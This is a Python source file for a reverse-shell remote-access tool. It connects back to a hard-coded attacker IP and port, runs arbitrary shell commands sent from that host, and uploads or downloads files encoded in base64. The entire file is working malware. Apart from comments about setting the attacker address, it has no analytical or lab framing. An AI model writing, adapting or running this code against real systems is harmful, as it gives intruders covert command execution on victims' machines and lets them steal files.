import socket
import subprocess
import os
import base64
import json

# Set up the target server and port (attacker's machine)
HOST = "10.0.1.37"  # Replace with the attacker's IP address
PORT = 4444         # Replace with the port the attacker is listening on

# Helper functions for file transfer
def send_json(sock, data):
    try:
        json_data = json.dumps(data)
        sock.send(json_data.encode())
    except Exception as e:
        sock.sendall(f"[ERROR] Failed to send data: {e}\n".encode("utf-8"))

def receive_json(sock):
    json_data = ""
    while True:
        try:
            json_data += sock.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue

def read_file(path):
    try:
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()
    except FileNotFoundError:
        return "[ERROR] File not found."

def write_file(path, content):
    try:
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[SUCCESS] File uploaded successfully."
    except Exception as e:
        return f"[ERROR] Failed to write file: {e}"

def execute_command(command):
    return subprocess.run(command, shell=True, capture_output=True)

# Create a socket object to connect back to the attacker
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    sock.connect((HOST, PORT))
    sock.sendall("Successfully connected to the client.\n".encode("utf-8"))

    default_prompt = "admin@medusax~$ "
    current_prompt = default_prompt
    in_shell_mode = False

    while True:
        sock.sendall(current_prompt.encode("utf-8"))
        command = sock.recv(1024).decode("utf-8").strip()

        if command.startswith("upload"):
            try:
                _, filename = command.split(" ", 1)
                file_content = read_file(filename)
                send_json(sock, ["upload", filename, file_content])
                response = receive_json(sock)
                sock.sendall(response.encode("utf-8"))
            except Exception as e:
                sock.sendall(f"[ERROR] {e}\n".encode("utf-8"))

        elif command.startswith("download"):
            try:
                _, filename = command.split(" ", 1)
                send_json(sock, ["download", filename])
                file_content = receive_json(sock)
                result = write_file(filename, file_content)
                sock.sendall(result.encode("utf-8"))
            except Exception as e:
                sock.sendall(f"[ERROR] {e}\n".encode("utf-8"))

        elif command.lower() == "km":
            sock.sendall("Disconnecting...\n".encode("utf-8"))
            sock.close()
            break

        elif command.lower() == "shell":
            try:
                os.chdir("C:\\")
                in_shell_mode = True
                current_prompt = f"{os.getcwd()} > "
                sock.sendall("Entering remote shell mode. Type 'exit' to leave.\n".encode("utf-8"))
            except Exception as e:
                sock.sendall(f"Failed to switch to C:\\: {e}\n".encode("utf-8"))

        elif command.startswith("shell -d"):
            try:
                _, _, directory = command.partition("-d")
                directory = directory.strip()
                os.chdir(directory)
                in_shell_mode = True
                current_prompt = f"{os.getcwd()} > "
                sock.sendall(f"Changed directory to {directory}\n".encode("utf-8"))
            except Exception as e:
                sock.sendall(f"Failed to change directory: {e}\n".encode("utf-8"))

        elif in_shell_mode:
            if command.lower() == "exit":
                in_shell_mode = False
                current_prompt = default_prompt
                sock.sendall("Exiting remote shell mode.\n".encode("utf-8"))
            else:
                output = execute_command(command)
                sock.sendall(output.stdout + output.stderr)

        else:
            sock.sendall("Invalid command. Use 'shell', 'shell -d <dir>', 'upload', 'download', or 'km'.\n".encode("utf-8"))

except Exception as e:
    print(f"Error: {e}")
    sock.close()
